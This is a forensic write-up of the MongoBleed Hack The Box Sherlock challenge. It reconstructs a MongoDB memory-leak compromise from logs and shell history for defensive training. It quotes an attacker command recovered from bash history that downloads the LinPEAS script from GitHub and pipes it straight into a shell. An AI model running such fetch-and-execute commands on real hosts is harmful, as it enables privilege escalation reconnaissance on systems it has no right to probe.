# MongoBleed - Hack The Box Sherlock Writeup

## Basic Information

| Category | Details |
|----------|----------|
| Platform | Hack The Box Sherlock |
| Challenge | MongoBleed |
| Category | Incident Response / Linux DFIR |
| Difficulty | Easy |
| Evidence Type | UAC Linux Triage Collection |
| Operating System | Linux |

---

# Introduction

Today we are solving another **Hack The Box Sherlock** challenge focused on **Defensive Security** and **Digital Forensics & Incident Response (DFIR)** named **MongoBleed**.

Unlike traditional penetration testing machines, Sherlock challenges place us in the role of an Incident Responder investigating evidence collected from an already compromised system. Instead of exploiting vulnerabilities ourselves, our objective is to analyze forensic artifacts, reconstruct the attack timeline, identify attacker activity, and provide an initial incident assessment.

In this challenge we investigate a Linux server running **MongoDB** that is suspected of being compromised through a recently disclosed vulnerability known as **MongoBleed**. The system administrator has already collected a **UAC (Unix-like Artifacts Collector)** triage package, allowing us to perform offline forensic analysis without requiring live access to the server.

Throughout this investigation we will examine MongoDB logs, SSH authentication logs, Bash history, and collected artifacts to determine how the compromise occurred and what actions were performed after the attacker obtained access.

---

# Scenario

The provided scenario states:

> You were contacted early this morning to handle a high-priority incident involving a suspected compromised server. The host, **mongodbsync**, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as **MongoBleed**. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

A **UAC triage acquisition** has already been collected from the system.

Our task is to determine:

- Whether the server was compromised.
- How the attacker gained access.
- What actions were performed.
- Whether persistence or privilege escalation occurred.
- Whether sensitive data may have been accessed or exfiltrated.

---

# Objectives

During this investigation we aim to:

- Identify the vulnerable MongoDB version.
- Confirm exploitation of MongoBleed.
- Identify the attacker's IP address.
- Build the attack timeline.
- Determine attacker behavior.
- Identify privilege escalation activity.
- Identify possible data exfiltration.
- Produce an initial incident assessment.

---

# Investigation Methodology

The investigation follows the workflow below.

```
UAC Triage
      │
      ▼
Artifact Review
      │
      ▼
MongoDB Log Analysis
      │
      ▼
MongoBleed Detection
      │
      ▼
Authentication Logs
      │
      ▼
Shell History
      │
      ▼
Timeline Reconstruction
      │
      ▼
Incident Assessment
```

---

# Understanding UAC

The evidence supplied for this Sherlock was collected using **UAC (Unix-like Artifacts Collector)**.

UAC is an open-source forensic collection framework designed to gather artifacts from Linux and Unix-based operating systems.

Typical artifacts collected include:

- Authentication logs
- Bash history
- Running processes
- Cron jobs
- Installed packages
- Network configuration
- File metadata
- System logs
- Memory information
- User activity

Since UAC preserves important evidence without requiring extensive manual collection, it is widely used during Linux incident response investigations.

---

# Reviewing the Collected Evidence

After extracting the provided archive using the supplied password:

```
hacktheblue
```

the following directories become available:

```
bodyfile

hash_executables

live_response

[root]

system
```

Each directory contains different categories of forensic evidence gathered from the compromised server.

For this investigation, the primary sources of evidence include:

- MongoDB logs
- Authentication logs
- Bash history
- File system artifacts

---

# Question 1

## Identify the MongoBleed Vulnerability

Before analyzing the collected artifacts, understanding the reported vulnerability is important.

The scenario specifically references:

```
MongoBleed
```

Searching MongoDB's official security advisories reveals that MongoBleed refers to a heap memory disclosure vulnerability affecting vulnerable MongoDB versions.

The assigned CVE identifier is:

```
CVE-2025-14847
```

### Answer

```
CVE-2025-14847
```

---

# Understanding MongoBleed

MongoBleed is a memory disclosure vulnerability affecting MongoDB.

Successful exploitation allows attackers to retrieve portions of heap memory from the MongoDB server.

Although this vulnerability does not directly provide code execution, exposed memory may contain:

- User credentials
- Authentication tokens
- Internal configuration
- Sensitive application data

Recovered credentials can then be leveraged for further attacks, including SSH access and lateral movement.

---

# Question 2

## Determine the Installed MongoDB Version

The next objective is identifying the MongoDB version running on the compromised server.

The MongoDB log file is examined.

```bash
cat mongod.log | head -15
```

Reviewing the startup messages reveals the database version.

```
8.0.16
```

### Answer

```
8.0.16
```

---

# Why Version Identification Matters

Knowing the installed version allows investigators to determine:

- Whether the host is vulnerable.
- Which CVEs apply.
- Whether exploitation is technically feasible.
- Whether emergency patching is required.

Since version **8.0.16** falls within the affected versions, exploitation becomes highly likely.

---

# Question 3

## Identify the Attacker's IP Address

The next objective is determining whether exploitation actually occurred.

Instead of manually parsing thousands of MongoDB log entries, a specialized detection utility is used.

```
mongobleed-detector
```

The detector analyzes MongoDB logs for exploitation patterns associated with MongoBleed.

Characteristics include:

- Extremely high connection rates.
- Immediate connection termination.
- Metadata request anomalies.
- Large numbers of rapid client sessions.

Running the detector reveals a suspicious external IP address repeatedly interacting with the database.

```
65.0.76.43
```

### Answer

```
65.0.76.43
```

---

# Why This IP Is Suspicious

Normal MongoDB clients maintain relatively stable connections.

MongoBleed exploitation instead generates:

- Thousands of rapid connections.
- Immediate disconnects.
- Extremely abnormal connection frequency.

These behaviors closely match the published exploitation methodology for MongoBleed.

---

# Question 4

## Determine When Exploitation Began

The detector also reports the earliest confirmed malicious activity.

Reviewing the generated timeline reveals the first exploitation event.

```
2025-12-29 05:25:52
```

### Answer

```
2025-12-29 05:25:52
```

This timestamp represents the earliest confirmed exploitation attempt observed in the MongoDB logs.

---

# Importance of Attack Timelines

Accurate timestamps allow investigators to:

- Correlate IDS alerts.
- Compare firewall logs.
- Review authentication events.
- Identify attacker progression.
- Determine dwell time.

Building a reliable timeline is one of the most important objectives during incident response.

---

# Question 5

## Determine the Number of Malicious Connections

MongoBleed exploitation is characterized by an unusually high number of very short-lived database connections.

Knowing the attacker's IP address, the MongoDB log can be filtered directly.

```bash
grep "65.0.76.43" mongod.log | wc -l
```

Output:

```
75260
```

This indicates that the attacker initiated:

```
75,260
```

connections during the exploitation phase.

### Answer

```
75260
```

---

# Why So Many Connections?

MongoBleed does not rely on a single request.

Instead, the exploit repeatedly creates and closes MongoDB connections to trigger heap memory disclosure.

As a result:

- Thousands of connections are generated.
- Sessions terminate almost immediately.
- Metadata requests become highly abnormal.
- Connection rates increase dramatically.

Such behavior is highly unusual in production environments and serves as one of the strongest indicators of successful exploitation.

---

# Current Investigation Findings

At this stage we have confirmed:

- The affected vulnerability is **CVE-2025-14847**.
- MongoDB **8.0.16** was installed.
- The vulnerable version was successfully exploited.
- The attack originated from **65.0.76.43**.
- Exploitation began at **2025-12-29 05:25:52 UTC**.
- The attacker generated **75,260** malicious MongoDB connections consistent with MongoBleed exploitation.

The next phase of the investigation focuses on analyzing SSH authentication logs, determining when the attacker gained interactive access, examining Bash history for privilege escalation activity, identifying attempted data access and exfiltration, reconstructing the complete attack timeline, and producing an initial incident assessment.

# Question 6

## Determine When the Attacker Gained Interactive Access

After confirming successful exploitation of the MongoBleed vulnerability, the next objective is determining whether the attacker successfully transitioned from exploiting the MongoDB service to obtaining interactive access on the operating system.

The most reliable source for this information is the SSH authentication log.

The authentication log is searched using the previously identified malicious IP address.

```bash
grep "65.0.76.43" auth.log
```

The results reveal multiple failed authentication attempts targeting the **mongoadmin** account before a successful login.

Relevant log entries include:

```text
2025-12-29T05:39:21.879041+00:00
PAM Authentication failure

2025-12-29T05:39:24.088863+00:00
PAM Authentication failure

2025-12-29T05:39:24.276756+00:00
Accepted keyboard-interactive/pam for mongoadmin
```

Immediately after several failed attempts, the attacker successfully authenticates.

The successful login occurred at:

```
2025-12-29 05:39:24 UTC
```

### Answer

```
2025-12-29 05:39:24 UTC
```

---

# Analysis

This sequence strongly suggests the following attack progression:

```
MongoBleed Exploitation

↓

Credential Disclosure

↓

Brute Force / Credential Validation

↓

Successful SSH Login
```

The attacker likely recovered authentication material from leaked MongoDB memory and immediately attempted to authenticate using the exposed credentials.

Unlike automated brute-force tools that continue attacking after success, this session remains active for several minutes, indicating manual interaction.

---

# Why Interactive Access Matters

Obtaining an interactive shell represents a major escalation in the attack lifecycle.

Once authenticated, an attacker can:

- Enumerate the system.
- Search for sensitive files.
- Escalate privileges.
- Install persistence.
- Access databases.
- Exfiltrate confidential information.

At this stage, the compromise transitions from vulnerability exploitation to full post-exploitation activity.

---

# Question 7

## Identify the Privilege Escalation Command

The next objective is determining what the attacker executed after logging into the server.

Since the compromised account is:

```
mongoadmin
```

its Bash history provides valuable evidence.

Navigating to the user's shell history reveals several executed commands.

One command immediately stands out.

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Answer

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

---

# Understanding LinPEAS

**LinPEAS** is one of the most widely used Linux privilege escalation enumeration tools.

Rather than exploiting vulnerabilities directly, it performs hundreds of security checks including:

- Writable files
- SUID binaries
- Kernel vulnerabilities
- Docker escapes
- Cron jobs
- Password files
- Capabilities
- Misconfigurations
- Weak permissions

Attackers frequently execute LinPEAS immediately after obtaining an initial shell because it rapidly identifies privilege escalation opportunities.

The presence of this command confirms that the attacker had begun local privilege escalation reconnaissance.

---

# Question 8

## Identify the Target Directory

Continuing to review the Bash history reveals additional attacker commands.

Among them is repeated interaction with the following directory:

```
/var/lib/mongodb
```

This directory contains MongoDB database files and is the primary storage location for database collections.

### Answer

```
/var/lib/mongodb
```

---

# Why This Directory Was Targeted

Since the compromised server functions as a secondary MongoDB server, the attacker's primary objective was likely database access.

The MongoDB data directory may contain:

- Database collections
- User credentials
- Application data
- Internal configuration
- Authentication information

Additionally, the attacker launched a temporary Python HTTP server shortly afterward.

This strongly suggests preparation for data staging or exfiltration.

---

# Complete Attack Timeline

Combining all collected evidence allows reconstruction of the complete incident.

```
MongoDB Server Running
        │
        ▼
MongoBleed Exploitation
        │
        ▼
75,260 Malicious Connections
        │
        ▼
Heap Memory Disclosure
        │
        ▼
Credential Exposure
        │
        ▼
SSH Authentication Attempts
        │
        ▼
Successful Login
        │
        ▼
Interactive Shell
        │
        ▼
LinPEAS Enumeration
        │
        ▼
MongoDB Directory Access
        │
        ▼
Python Web Server Started
        │
        ▼
Possible Data Exfiltration
```

---

# Indicators of Compromise (IOCs)

| Indicator | Value |
|-----------|-------|
| Vulnerability | CVE-2025-14847 |
| MongoDB Version | 8.0.16 |
| Malicious IP | 65.0.76.43 |
| Exploitation Start | 2025-12-29 05:25:52 UTC |
| Successful SSH Login | 2025-12-29 05:39:24 UTC |
| Target User | mongoadmin |
| Malicious Connections | 75,260 |
| Enumeration Tool | LinPEAS |
| Target Directory | `/var/lib/mongodb` |

---

# MITRE ATT&CK Mapping

| Technique | ATT&CK ID |
|------------|-----------|
| Exploit Public-Facing Application | T1190 |
| Valid Accounts | T1078 |
| Brute Force / Password Guessing | T1110 |
| Command and Scripting Interpreter (Unix Shell) | T1059.004 |
| System Information Discovery | T1082 |
| File and Directory Discovery | T1083 |
| Permission Groups Discovery | T1069 |
| Data from Local System | T1005 |
| Exfiltration Over Web Service | T1567 |

---

# Initial Incident Assessment

Based on the available forensic evidence, the compromise appears to have progressed through several distinct stages.

### Initial Access

The attacker successfully exploited the MongoBleed vulnerability affecting MongoDB version **8.0.16**.

The exploitation generated over **75,000** abnormal MongoDB connections originating from **65.0.76.43**.

---

### Credential Access

The memory disclosure vulnerability likely exposed authentication credentials or other sensitive information stored within MongoDB process memory.

These credentials were subsequently used during SSH authentication attempts.

---

### Initial Foothold

The attacker successfully authenticated as:

```
mongoadmin
```

through SSH and established an interactive shell.

---

### Post-Exploitation

After obtaining shell access, the attacker downloaded and executed **LinPEAS** to identify privilege escalation opportunities.

This indicates manual attacker interaction rather than fully automated exploitation.

---

### Data Access

The attacker's attention shifted toward:

```
/var/lib/mongodb
```

which contains MongoDB database files.

The launch of a Python web server strongly suggests staging or transferring collected data.

---

### Overall Assessment

The available evidence indicates a **confirmed compromise**.

The attack progressed beyond vulnerability exploitation and reached:

- Interactive remote access.
- Local reconnaissance.
- Privilege escalation enumeration.
- Database access.
- Possible data exfiltration.

Although no direct evidence of persistence was observed within the provided artifacts, additional forensic acquisition would be required to rule it out completely.

---

# Recommended Next Steps

Immediate response actions should include:

- Isolate the affected MongoDB server from the network.
- Patch MongoDB to a version not affected by **CVE-2025-14847**.
- Rotate all MongoDB credentials.
- Reset SSH credentials for the **mongoadmin** account.
- Review other systems for authentication attempts originating from **65.0.76.43**.
- Examine firewall, IDS, and VPN logs for related activity.
- Analyze database contents for unauthorized access or modification.
- Review outbound network traffic for evidence of successful data exfiltration.
- Perform full memory and disk forensic acquisition before rebuilding the host.

---

# Lessons Learned

This Sherlock demonstrates how a seemingly limited memory disclosure vulnerability can rapidly escalate into a complete system compromise.

Although MongoBleed does not directly provide remote code execution, leaked credentials enabled the attacker to gain legitimate SSH access, perform system reconnaissance, and target sensitive MongoDB data.

The investigation also highlights the importance of comprehensive log analysis. By correlating MongoDB logs, SSH authentication records, and shell history, we successfully reconstructed the attack timeline and identified each stage of the intrusion.

Perhaps the most valuable takeaway is that attackers often rely on chaining multiple weaknesses together. A memory disclosure vulnerability, exposed credentials, and inadequate monitoring combined to allow an attacker to move from initial exploitation to potential data theft.

---

# Conclusion

**MongoBleed** is an excellent Linux Incident Response and Digital Forensics challenge that demonstrates how investigators can reconstruct a real-world compromise using artifacts collected through **Unix-like Artifacts Collector (UAC)**. Through systematic analysis of MongoDB logs, SSH authentication records, and Bash history, we confirmed exploitation of **CVE-2025-14847**, identified the attacker's infrastructure, established the timeline of malicious activity, and documented the transition from vulnerability exploitation to interactive system access.

The investigation revealed that the attacker leveraged leaked credentials to authenticate as **mongoadmin**, executed **LinPEAS** for privilege escalation reconnaissance, and accessed the MongoDB data directory before preparing a Python web server that likely supported data staging or exfiltration. These findings demonstrate a clear progression through multiple stages of the cyber kill chain, emphasizing the importance of timely patching, credential protection, continuous monitoring, and rapid incident response.

Overall, MongoBleed provides an excellent practical exercise in Linux forensic analysis, log correlation, and incident triage while reinforcing the importance of combining multiple forensic artifacts to produce an accurate and actionable incident assessment.
